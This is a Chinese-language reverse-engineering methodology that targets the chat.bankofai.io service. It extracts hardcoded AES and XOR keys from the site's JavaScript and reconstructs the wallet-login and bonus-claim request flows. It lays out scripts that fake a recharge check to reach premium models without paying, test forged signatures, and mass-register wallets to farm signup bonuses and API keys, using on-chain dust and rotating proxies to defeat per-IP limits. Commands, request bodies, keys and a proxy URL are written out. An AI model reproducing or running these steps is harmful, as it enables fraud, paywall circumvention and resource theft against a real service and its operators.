# 逆向工程复现方法论：chat.bankofai.io

以 chat.bankofai.io 为案例，完整复现从 Chrome DevTools 抓包到全自动批量注册的逆向工程流程。

---

## Phase 1: 信息收集与防护等级评估

### 1.1 Chrome DevTools 抓包

1. 打开隐身窗口（避免缓存/cookie污染）→ `https://chat.bankofai.io`
2. F12 → Network 标签 → 勾选 **Preserve log**（跨页面保留）
3. 清空日志 → 点击「钱包登录」完成登录
4. 右键任意请求 → **Save all as HAR with content** — 最关键的一步，HAR 文件包含完整的请求/响应 body

分析 HAR 识别认证协议指纹。以本项目为例：

| 顺序 | URL 模式 | 协议指纹 | 作用 |
|------|----------|----------|------|
| 1 | `/api/auth/csrf` | next-auth | 获取 CSRF token |
| 2 | `/api/auth/callback/metamask` | next-auth | 钱包签名登录 |
| 3 | `/api/auth/session` | next-auth | 验证登录态 |
| 4 | `/trpc/lambda/user.claimSignupBonus?batch=1` | tRPC | 领取新用户奖励 |
| 5 | `/trpc/lambda/apiKey.createApiKey?batch=1` | tRPC | 创建 API Key |

**tRPC 识别特征**：URL 带 `?batch=1`，请求体是 `[{"json": {...}}]` 的 JSON-RPC 风格数组——tRPC HTTP batch 链接的标志性格式。

其他关键发现：
- `/webapi/chat/{sdkType}` — 实际发送消息的端点
- `X-ainft-chat-auth` 头 — 自定义认证头，值为 base64 编码
- 缺少 User-Agent 头会直接 400 — 服务端有基础反爬

### 1.2 防护等级判定

| 等级 | 特征 | 判定 |
|------|------|------|
| **T0** | 源码无压缩，函数名+变量名可读 | 直接用 |
| **T1** | webpack 打包 + 变量名缩短（如 `a`, `b`, `cX`），但模块结构保留 | 本项目 = T1 |
| **T2** | 字符串加密、控制流平坦化、虚假分支 | 需要去混淆 |
| **T3** | VMP、WASM 虚拟机保护 | 需要动态分析 |

本项目判定为 T1 的证据：
- 文件是 `26057-8322daa47a4f566f.js` 这种 webpack chunk 命名
- 模块内部变量被压缩为 `a`/`b`/`c` 但逻辑结构清晰
- 关键字符串如 `"LobeHub · LobeHub"`、`"BANK OF AI welcome gift-claim"` 没有被加密
- 可以搜索 `AES.encrypt`、`signMessage`、`claimSignupBonus` 定位关键逻辑

### 1.3 分析重点确定

从 Network 请求序列确定分析优先级：
1. **钱包登录** — 因为有签名 + CSRF + Cookie 三个环节
2. **Claim Bonus** — 因为有 AES 加密 token + 签名组合
3. **创建 API Key** — 因为有 session 验证
4. **Premium 模型访问** — 因为有 `X-ainft-chat-auth` 自定义头

## Phase 2: 核心发现提取

### 2.1 依赖分析（从 Sources 面板）

| 搜索词 | 匹配结果 | 推断 |
|--------|----------|------|
| `ethers` | `require("ethers")` / `ethers.Wallet` | EVM 钱包操作 |
| `crypto-js` | `CryptoJS.AES.encrypt` | AES 加密在客户端 |
| `tronWeb` / `tronLink` | `window.tronLink.request` | TRON 链支持 |
| `@trpc` / `trpc` | `/trpc/lambda/` + batch 格式 | tRPC 通信协议 |

```javascript
const { ethers } = require('ethers');    // ← EVM 钱包
const CryptoJS = require('crypto-js');   // ← AES 加密
```

### 2.2 硬编码密钥提取 — 搜索策略

1. **搜索 `AES.encrypt`** → 定位加密调用，回溯到 key 变量
2. **搜索 `=` 加长 base64 字符串** → `[A-Za-z0-9+/=]{32,}` 正则搜索
3. **搜索 `.sign(` `.signMessage`** → 定位签名逻辑

本项目两个核心密钥：

```javascript
// 1. AES 密钥（用于 claim token 加密）
// 来源: module 166472, 文件 27386-8fe193aece9ded00.js
AES_KEY = "1wT1r7z8bZxDHVmZKAs6VFYSXOxmyh0lLByiw5TmF0="

// 2. XOR 密钥（用于 X-ainft-chat-auth 认证头）
// 来源: module 731299, 文件 35786-bd4b29a5644dae03.js
XOR_KEY = "LobeHub · LobeHub"
```

提取流程：
1. 在 Sources 搜索 `AES.encrypt` → 找到 module `166472`
2. 追踪该函数调用的上下文 → 发现 `AES.encrypt(payload, key)`
3. 回溯 key 的来源 → 发现硬编码的 base64 字符串
4. 搜索 `LobeHub` → 找到 module `731299` → 确认为 XOR key

### 2.3 签名消息格式还原

搜索 `signMessage` 或模板字符串中包含 `address`/`Chain ID` 的模式。

```javascript
// 登录签名消息（SIWE-like 格式）
// 来源: 26057-8322daa47a4f566f.js, module 28386 (TRON) / module 968943 (EVM)
`Welcome to BANK OF AI !
chat.bankofai.io wants you to sign in with your account:
${address}

Chain ID: ${chainIdHex}
Expiration Time: ${expiry}
Nonce: ${nonce}`

// Claim 签名消息（与登录签名格式完全不同！这是关键发现）
`BANK OF AI welcome gift-claim
Account:
${address}
Chain ID: ${chainIdHex}
Nonce: ${nonce}`
```

登录消息和 Claim 消息使用**完全不同**的格式——这意味着不能复用登录签名来领取奖励。

### 2.4 证据表（标准格式）

| # | 发现 | 证据锚点 | 置信度 |
|---|------|----------|--------|
| 1 | AES密钥硬编码 | `27386-8fe193aece9ded00.js` module 166472 | HIGH |
| 2 | SIWE 签名消息格式 | `26057-8322daa47a4f566f.js` module 28386 | HIGH |
| 3 | Claim 签名消息格式 | 实际抓包 + 测试验证 | HIGH |
| 4 | XOR 认证头密钥 | `35786-bd4b29a5644dae03.js` module 731299 | HIGH |
| 5 | tRPC 通信协议 | HAR 抓包 + batch JSON-RPC 格式 | HIGH |

置信度标准：
- **HIGH** = 源码中直接可见 + 动态调试确认
- **MEDIUM** = 源码推断 + 未动态验证
- **LOW** = 仅 HAR 抓包推测，未找到源码对应

## Phase 3: 调用链复现

### 3.1 登录流程调用链

```
GET /api/auth/csrf
Headers: Accept: application/json
Response: { "csrfToken": "xxx..." }
         Set-Cookie: next-auth.csrf-token=...

        ↓

POST /api/auth/callback/metamask
Content-Type: application/x-www-form-urlencoded
Cookie: next-auth.csrf-token=...
Body: chain=eth
      &message=Welcome to BANK OF AI !\nchat.bankofai.io...
      &signature=0x...
      &version=2
      &csrfToken=xxx
      &callbackUrl=https://chat.bankofai.io/chat
Response: Set-Cookie: session-token=...  ← 核心！有这个才算登录成功

        ↓

GET /api/auth/session
Cookie: session-token=...
Response: { "user": { ... }, "expires": "..." }
```

### 3.2 Claim 流程调用链

```
POST /trpc/lambda/user.claimSignupBonus?batch=1
Content-Type: application/json
Cookie: session-token=...
Body: [{
  "0": {
    "json": {
      "address": "0x...",
      "chain": "eth",
      "encryptedToken": "U2FsdGVkX1...",  ← AES 加密的 token
      "message": "BANK OF AI welcome gift-claim\n...",
      "signature": "0x...",
      "type": "wallet",
      "version": "2"
    }
  }
}]
Response: [{ "result": { "data": { "json": { "success": true, "amount": 500000 } } } }]
```

### 3.3 Premium 绕过调用链

```
用户点击模型选择器（UI层门控）
  ↓
trpc.user.isRecharged.query()  → { isRecharged: false }
  ↓
needsRecharge = model.abilities.premium && !isRecharged
  ↓
true → UI 置灰，显示「购买」按钮
  ↓
[BYPASS] 拦截 isRecharged 返回 true → 绕过 UI 限制
  ↓
POST /webapi/chat/anthropic
  Header: X-ainft-chat-auth = XOR({accessCode, userId}, "LobeHub · LobeHub") → base64
  ↓
服务端: 验证 session → 检查 credits → 调用 LLM API
  ❌ 不检查 isRecharged 标志！
```

三种绕过方法：
1. **浏览器 fetch 拦截** — 粘贴到 Console 即可，最简单
2. **直接 HTTP 请求** — `node premium_bypass.js --run <cookie> <model>`
3. **API Key 调用** — `https://api.bankofai.io/v1/chat/completions`（完全绕开 Web UI）

## Phase 4: PoC 重放测试

### 4.1 PoC 层级 0 — 假签名测试（`poc_batch_claim.js`）

最先运行的脚本，1 分钟内判断服务端是否真正验证签名，无需任何配置。

```javascript
// 核心问题: 服务端是否真正验证钱包签名？
// 测试方法: 发送随机假签名 + 随机假地址
const address = randomAddress();  // 随机 20 字节，非真实钱包
const signature = fakeSignature(); // 随机 65 字节，对不上任何地址
```

三种响应及对策：

| 响应 | 含义 | 下一步 |
|------|------|--------|
| HTML 页面 | Cloudflare/网关拦截 | 需要代理 |
| `REJECTED` + 错误消息 | 服务端验证了某字段 | 分析错误消息 -> 修复 |
| `ACCEPTED` | 无签名验证！ | 直接用假签名批量刷 |

### 4.2 PoC 层级 1 — 单次流程验证（`auto_sign_claim.js`）

假签名被拒绝后，用真实签名测试完整流程：

```bash
node auto_sign_claim.js
```

不传参数 = 只跑 1 次。7 个步骤（钱包创建 → 签名 → CSRF → 登录 → Session → Claim → API Key），每步有详细日志。

### 4.3 PoC 层级 2 — Base 链粉尘流程（`test_base_dust_claim.js`）

如果层级 1 的 Claim 失败且报余额/链上活动相关错误，说明需要 Base 链粉尘：

```bash
FUNDER_PRIVATE_KEY=0x... node test_base_dust_claim.js
```

增加的 2 步：funder 转账 dust → 等待 1 区块确认 → 再跑 claim 流程。

### 4.4 PoC 层级 3 — 批量重放工具（`web_replay.js`）

完整封装了所有 tRPC 端点，可作为其他脚本的基础库。导出函数：

```
encryptToken, decryptToken, buildSignMessage,
claimSignupBonus, createApiKey, getApiKeys, deleteApiKey,
generateCurlExamples, AES_KEY, TRPC_URL
```

## Phase 6: 全自动批量注册

### 三代脚本演变

| 维度 | 第一代 `auto_sign_claim` | 第二代 `batch_base` | 第三代 `batch_proxy` |
|------|-------------------------|--------------------|--------------------|
| 网络 | 直连 | 直连 | 代理轮换 |
| Base 链 | 不涉及 | FunderQueue nonce 序列化 | 不涉及 |
| IP 限制 | 容易命中 | 容易命中 | 自动绕过 |
| 断点续传 | 写完 JSON | 增量写入 | 增量写入 + 多轮监测 |
| 产量 | 3-5 keys/min | 30-50 keys/min | 不限（持续跑） |
| 配置 | 零配置 | `FUNDER_PRIVATE_KEY` | `PROXY_API_URL` |

### 6.1 第一代: 单线程版本

```bash
node auto_sign_claim.js               # 跑 1 次
node auto_sign_claim.js 10 3 200      # 跑 10 次，3 并发，2s 间隔
```

无代理、无 Base 粉尘，适合初步验证流程可用性。

### 6.2 第二代: Base 链粉尘版本

```
Funder 钱包 → 并发发送 dust (需 nonce 串行化) → 等待确认 → Claim
```

- 解决卡点：服务端检查钱包是否有链上活动
- 成本：~\$0.0000004 / 账号
- 适合少量生产（几十到几百个）

### 6.3 第三代: 多 IP 轮换版本

```
PROXY_API_URL → 获取代理列表 → 每个工人用不同代理 → 检测 IP 限制 → 自动轮换
```

核心创新：代理池轮换绕过 1 IP 只能 Claim 1 次的限制。

```bash
PROXY_API_URL="http://proxy.siyetian.com/apis_get.html?token=..." node batch_proxy.js
```

### 6.4 演变逻辑

```
第一代: 验证可行性 → 第二代会解决 → 第三代突破限制规模化
```

## 方法论文法总结

```
Phase 1 (抓包)      → HAR 导出 + 识别协议指纹 (next-auth / tRPC / 自定义头)
Phase 2 (核心发现)   → Sources 搜索 AES/crypto-js/signMessage 定位密钥和签名格式
Phase 3 (调用链)     → 还原 HTTP 请求序列: CSRF → Login → Session → Claim → API Key
Phase 4 (PoC)       → 分层测试: 假签名 → 真签名 → Base粉尘 → 代理
Phase 5 (报告)       → 9 章结构模板: 摘要/发现/证据表/调用链/风险/FIU/行动/交付物/复现
Phase 6 (批量脚本)   → 三代演变: 单线程 → 链上粉尘 → 代理池轮换
```

### 关键原则

- **先验证后扩张**：PoC 假签名测试 → 单次完整流程 → 批量生产
- **逐层突破**：协议识别 → 签名还原 → 防护绕过 → 规模化
- **每个发现都要有证据锚点**：文件路径 + 模块编号 + 置信度
